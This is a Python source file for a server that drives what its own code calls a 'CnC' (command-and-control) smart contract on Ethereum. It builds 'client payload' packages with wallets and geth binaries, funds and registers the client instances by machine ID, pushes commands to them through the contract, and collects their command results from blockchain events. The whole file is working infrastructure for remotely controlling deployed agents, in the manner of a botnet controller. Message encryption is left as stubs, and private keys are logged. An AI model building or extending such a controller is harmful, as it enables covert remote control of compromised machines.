import yaml, os, sys, glob, atexit
from os.path import join as opj
from web3 import Web3, HTTPProvider
from web3.contract import ConciseContract
from Util.WalletOperations import unlockAccount, generatePassword, generateWallet, loadWallet, getAccountBalance
from Util.LogWrapper import LogWrapper
from shutil import copyfile,copy
from Util.EtherLogEvents import *
from Util.SolidityTypeConversions import *


import shelve

REGISTRATION_REQUEST_EVENT_NAME = 'RegistrationRequest'
COMMAND_RESULT_EVENT_NAME = 'CommandResult'


class ServerCommands:

	def __init__(self, confFile):

		with open(confFile) as f:
			conf = yaml.safe_load(f)

		
		l.info('Working in',conf['opMode'],'mode')

		self.contractAddress = conf['contract']['address']
		self.contractAbi = conf['contract']['abi']

		l.debug ("connecting to local node", conf['nodeRpcUrl'])
		self.web3 = Web3(HTTPProvider(conf['nodeRpcUrl']))

		# load CnC contract
		self.contract = self.loadContract()
		#TODO: check contract is up, otherwise go to sleep or die

		self.ownerAddress = conf['ownerAddress']
		self.ownerPassword = conf['ownerWalletPassword']
		self.keyGenScript = conf['keyGenScript']
		l.info("contract owner wallet address:",self.ownerAddress)
		unlockAccount(self.ownerAddress, self.ownerPassword, self.web3)

		self.gasLimit_tx = conf['gasLimit_tx']
		self.gasLimit_ev = conf['gasLimit_ev']

		self.instancesDbFile = conf['instancesDbFile']+'.'+self.contractAddress
		self.instances = shelve.open(self.instancesDbFile, writeback=True)
		
		if not 'cmdId' in self.instances:
			self.instances['cmdId'] = 0

		self.log_tx = LogWrapper.getLogger(name='transaction', filename=opj('logs', 'transaction.log'))

		#
		#
		# self.cmdId = shelve.open(self.instancesDbFile + '.cmdId')
		# if os.path.exists(self.instancesDbFile):
		# 	with open (self.instancesDbFile) as f:
		# 		db = yaml.safe_load(f)
		# 		self.instances = db['instances']
		# 		self.cmdId = db['cmdId']
		# 	l.debug('loaded instancesDb file to', self.instancesDbFile)
		# else:
		# 	l.debug('no instance db. creating a new one')
		# 	self.instances = {}
		# 	self.cmdId = 0
		#
		# atexit.register(
		# 	lambda : self.writeInstancesDB())

	# def writeInstancesDB(self):
	# 	with open(self.instancesDbFile, 'w') as f:
	# 		yaml.safe_dump({'instances':self.instances,'cmdId':self.cmdId}, f)
	# 	l.debug('save instancesDb file to',self.instancesDbFile)

	def loadContract(self):

		l.info('loading contract from:', self.contractAddress, self.contractAbi)

		contract = self.web3.eth.contract(self.contractAbi, self.contractAddress,  ContractFactoryClass=ConciseContract)
		return contract

	'''
		
		:param clientConfTemplateFile: 
		:param clientId: 
		:param rpcPort: 
		:param walletJson: 
		:param walletPassword: 
		:return: 
	'''
	def generateNewClientInstance (self, clientConfTemplateFile, fundValue, clientId = '', rpcPort = 8545, port=30303, walletJson = None, walletPassword = None):
		
		l.info ("Creating new Client instance")
		walletPassword = generatePassword(20) if walletPassword == None else walletPassword

		if not walletJson:
			l.info("Generating a new account")
			walletJson, public, private, address = generateWallet(
				self.keyGenScript, walletPassword)
		else:
			l.info("Loading existing wallet...")
			public, private, address = loadWallet(walletJson, walletPassword)

		l.info('Client Account Details:')
		l.info('\tPublic key:', public)
		l.info('\tAddress:', address)
		l.debug('\tPrivate key:', private)

		#Generate Conf
		with open(clientConfTemplateFile) as f:
			clientConfTemplate = yaml.safe_load(f)
		
		opMode = clientConfTemplate['opMode']
		l.info('Client is to be generated for', opMode, 'mode')
		
		clientConfTemplate['nodeRpcUrl'] = clientConfTemplate['nodeRpcUrl'].replace('%NODEPORT%', str(rpcPort))
		clientConfTemplate['BlockChainData'] = clientConfTemplate['BlockChainData'].replace('%CLIENT_ID%', clientId)
		clientConfTemplate[opMode]['gethCmd'] = ' '.join(clientConfTemplate[opMode]['gethCmd']) \
			.replace('%RPCPORT%', str(rpcPort)) \
			.replace('%NODEPORT%', str(port)) \
			.replace('%DATADIR%', clientConfTemplate['BlockChainData']) \
			.split(' ')
		clientConfTemplate['clientWallet'] = walletJson
		clientConfTemplate['clientWalletPassword'] = walletPassword
		
		if opMode == 'mainNet':
			clientConfTemplate['privateNet'] = None
		
		

		# Package the Code
		#TODO add all components
		generatedDir = opj('generated',address)
		l.info('writing client payload into',generatedDir)
		os.makedirs(opj(generatedDir, 'src', 'Client'), exist_ok=True)
		for file in glob.glob(opj('src', 'Client', '*.py')):
			copy(file, opj(generatedDir, 'src', 'Client'))

		os.makedirs(opj(generatedDir, 'src', 'Util'), exist_ok=True)
		for file in glob.glob(opj('src', 'Util', '*.py')):
			copy(file, opj(generatedDir, 'src', 'Util'))

		os.makedirs(opj(generatedDir, 'bin'), exist_ok=True)
		copy(opj('bin','geth.exe'),opj(generatedDir, 'bin'))
		copy(opj('bin', 'genpriv.sh'), opj(generatedDir, 'bin'))

		os.makedirs(opj(generatedDir,'conf'), exist_ok=True)
		with open(opj(generatedDir, 'conf', 'clientConf.yaml'), 'w') as f:
			yaml.safe_dump(clientConfTemplate, f)

		os.makedirs(opj(generatedDir, 'build'), exist_ok=True)
		os.makedirs(opj(generatedDir, 'logs'), exist_ok=True)

		
		self.instances[address] = {}
		self.instances[address]['public'] = public
		self.instances[address]['commands'] = {}
		self.instances.sync()

		# txhash = self.web3.eth.sendTransaction({'from': self.ownerAddress, 'to': address,
		# 							 'value': fundValue, 'gas': 21000})
		#
		# logTransactionCost(self.web3, txhash, 'fundTransfer')
		# l.info ("Sending ",self.web3.fromWei(fundValue,"ether"),"ether to client wallet",)
		self.fundTransfer(address,fundValue)
		self.allowInstance(address)

		#TODO:Split the balance to a small amount up first in sendTransaction and add most of the funds in allowInstance, that way it will only be transfered if instance successfully registered.




		return address, clientConfTemplate

	def decryptMessage(self, msg, decrypt=True):
		if decrypt:
			pass
			#TODO compelete
		# 	alice = pyelliptic.ecc()
		# 	msg = alice.encrypt(msg,self.ownerPubKey)
		return msg

	def encryptMessage(self, instanceAddress, msg, encrypt=True):
		public = self.instances[instanceAddress]['public']
		if encrypt:
			# TODO compelete
			pass
		# 	bob = pyelliptic.ecc()
		# 	bob.decrypt()
		return msg

	def addWork (self, instanceAddress, command):
		if instanceAddress in self.instances:
			commandEnc = self.encryptMessage(instanceAddress,command)
			instanceHash = sha3AsBytes(instanceAddress)
			txhash = self.contract.addWork(instanceHash, commandEnc, self.instances['cmdId'], transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
			
			l.info("Command",self.instances['cmdId']," was sent to",instanceAddress, 'txHash:', txhash)
			transactionCostLogger.insert(self.web3, txhash, 'addWork',len(command), self.log_tx)
			
			self.instances[instanceAddress]['commands'][self.instances['cmdId']] = [command, None]
			self.instances['cmdId'] += 1
			self.instances.sync()
			return True
		return False

	def toBytes32Hash(self,x):
		return hexStringToBytes(self.web3.sha3(x))

	def removeInstance (self, instanceAddress):
		if instanceAddress in self.instances:
			instanceHash = sha3AsBytes(instanceAddress)
			txhash = self.contract.removeInstance(instanceHash, transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
			
			l.info("disallowing ",instanceAddress, 'txHash:', txhash)
			transactionCostLogger.insert(self.web3, txhash, 'removeInstance', len(instanceAddress), self.log_tx)
			
			l.info("sending back all remaining funds of", instanceAddress, 'to owner:', self.ownerAddress)
			self.unFundTransfer(instanceAddress)
			
			return True
		return False

	def allowInstance (self, instanceAddress):
		if instanceAddress in self.instances:
			instanceHash = sha3AsBytes(instanceAddress)
			txhash = self.contract.allowInstance(instanceHash, transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
			
			l.info("registration allowed for:",instanceAddress,'hash:',encode_hex(instanceHash),'txHash:',txhash)
			transactionCostLogger.insert(self.web3, txhash, 'allowInstance',len(instanceAddress), self.log_tx)
			
			return True
		return False
	
		
		
	def registrationConfirmation (self, instanceAddress, sessionId):
		if instanceAddress in self.instances:
			instanceHash = sha3AsBytes(instanceAddress)
			sessionId = self.encryptMessage(instanceAddress, sessionId)
			txhash = self.contract.registrationConfirmation(instanceHash,sessionId, transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
			
			l.info("sending successful registration confirmation to",instanceAddress,'txHash:',txhash)
			transactionCostLogger.insert(self.web3, txhash, 'registrationConfirmation', len(sessionId), self.log_tx)
			
			return True
		else:
			l.error("Got an a registration request from an address that is not local instances cache! This means that local cache and contract are unsynced! instance address:",instanceAddress)
			return False

	def fundTransfer(self, instanceAddress, fundValue):
		if instanceAddress in self.instances:
			txhash = self.web3.eth.sendTransaction({'from': self.ownerAddress, 'to': instanceAddress,
			                                        'value': fundValue, 'gas': 21000})
			l.info("Sending ", self.web3.fromWei(fundValue, "ether"), "ether to client wallet", )
			transactionCostLogger.insert(self.web3, txhash, 'fundTransfer',32, self.log_tx)
		else:
			l.error("Got a request to transfer funds to an instance that is not on the instance list!!! refusing of course... :",instanceAddress)
			return False
		
	def unFundTransfer(self, instanceAddress):
		if instanceAddress in self.instances:
			balance = getAccountBalance(self.web3,instanceAddress,'wei')
			txhash = self.web3.eth.sendTransaction({'from': instanceAddress, 'to': self.ownerAddress,
			                                        'value': int(balance), 'gas': 21000})
			l.info("Sending ", self.web3.fromWei(balance, "ether"), "ether to client wallet", )
			transactionCostLogger.insert(self.web3, txhash, 'fundTransfer',32, self.log_tx)
		else:
			l.error("Got a request to transfer funds to an instance that is not on the instance list!!! refusing of course... :",instanceAddress)
			return False

	def startInstanceRegistrationRequestWatcher(self):
			try:
				l.info('Starting to watch for new instance registrations...')
				self.regRequestFilter, eventABI = createLogEventFilter(REGISTRATION_REQUEST_EVENT_NAME,
																	self.contractAbi,
																	self.contractAddress,
																	self.web3,
																	topicFilters=[])

				def onRegistrationEventArrival(tx):
					l.debug('new registration request, tx:', tx)

					machineId = getLogEventArg(tx, eventABI, 'machineId')
					machineId = self.decryptMessage(machineId)

					transactionReceipt = self.web3.eth.getTransactionReceipt(tx['transactionHash'])
					instanceAddress = transactionReceipt['from']

					if instanceAddress in self.instances:
						l.info('confirmed new registration Request from:', instanceAddress, 'on machine:', machineId)
						#Contract has already validated that the instance is new and was not registered before
						#all we have to do is to generate the instanceId for it.
						sessionId = self.web3.sha3 (encode_hex(machineId) +
													instanceAddress[2:] + #removes the 0x...
													encode_hex(generatePassword())) #machineId+address+Random

						sessionAndMachineIdHash = self.web3.sha3(sessionId + machineId)

						self.registrationConfirmation(instanceAddress,sessionId)

						l.debug('saving sessionAndMachineIdHash for',instanceAddress,":", sessionAndMachineIdHash)
						self.instances[instanceAddress]['sessionAndMachineIdHash'] = sessionAndMachineIdHash
					else:
						raise ValueError('Someone tried to register an instance'+instanceAddress+' that is not in local instance cache. This can be cause contract and server are out of sync')
				
				self.regRequestFilter.watch(onRegistrationEventArrival)
				
			except Exception as e:
				l.error("Error in Instance Registraton event watcher operation:", e)
				if self.regRequestFilter and self.regRequestFilter.running:
					self.regRequestFilter.stopWatching()

	def startCommandResultWatcher(self):
			try:
				l.info('Starting to watch for command results from instances...')
				self.cmdResultFilter, eventABI = createLogEventFilter(COMMAND_RESULT_EVENT_NAME,
																	self.contractAbi,
																	self.contractAddress,
																	self.web3,
																	topicFilters=[])

				def onCommandResultEventArrival(tx):
					try:
						l.debug('new Command result:', tx)
	
						sessionAndMachineIdHash = bytesToHexString(getLogEventArg(tx, eventABI, 'sessionAndMachineIdHash'))
						commandResult = getLogEventArg(tx, eventABI, 'commandResult')
						commandResult = self.decryptMessage(commandResult)
						cmdId = getLogEventArg(tx, eventABI, 'cmdId')
	
						transactionReceipt = self.web3.eth.getTransactionReceipt(tx['transactionHash'])
						instanceAddress = transactionReceipt['from']
	
						if instanceAddress in self.instances:
							l.info('got new Commandresult for cmdId:',cmdId,"from:", instanceAddress, 'sessionAndMachineIdHash:', sessionAndMachineIdHash)
							if sessionAndMachineIdHash == self.instances[instanceAddress]['sessionAndMachineIdHash']:
								self.instances[instanceAddress]['commands'][cmdId][1] = commandResult
								self.instances.sync()
								l.info ('Confirmed match between instance issued command and result:',str(self.instances[instanceAddress]['commands'][cmdId])[0:200])
							else:
								l.error("Mismatch between saved session id and given by client! Client is invalid, recommend to remove!")
								l.error("given id:",sessionAndMachineIdHash,'saved:',self.instances[instanceAddress]['sessionAndMachineIdHash'])
						else:
							raise ValueError('got result from instance',instanceAddress,' that is not in local instance cache. This can be cause contract and server are out of sync')
					except Exception as e:
						l.error("Error getting Command Results:", e)
				self.cmdResultFilter.watch(onCommandResultEventArrival)
				
			except Exception as e:
				l.error("Error in Command Result event watcher operation:", e)
				if self.cmdResultFilter and self.cmdResultFilter.running:
					self.cmdResultFilter.stopWatching()

	def startAllWatchers(self):
		self.startInstanceRegistrationRequestWatcher()
		self.startCommandResultWatcher()

	def stopAllWatchers(self):
		self.cmdResultFilter.stopWatching()
		self.regRequestFilter.stopWatching()


if __name__ == "__main__":

	os.chdir(sys.argv[1])
	l = LogWrapper.getLogger()
	l.info("base dir ", sys.argv[1])

	sc = ServerCommands(opj('conf','server', 'ServerConf.yaml'))

	# clientAddress, clientConfTemplate = sc.generateNewClientInstance(opj('conf','clientGen', 'ClientConf.TEMPLATE.yaml'),fundValue=1000000000000000000, port=30304)

	sc.startAllWatchers()


